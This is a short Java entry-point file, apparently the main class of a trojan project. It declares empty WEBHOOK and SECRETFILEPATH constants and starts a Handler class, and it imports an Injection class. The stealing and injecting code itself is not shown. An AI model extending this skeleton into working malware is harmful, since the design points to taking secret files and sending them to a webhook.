package dev.px.trojan;

import dev.px.trojan.Impl.Handler;
import dev.px.trojan.Injection.Injection;

public class Trojan {

    public static final String WEBHOOK = "";
    public static final String SECRETFILEPATH = "";

    public static void main(String[] args) {
        new Handler();
    }
}
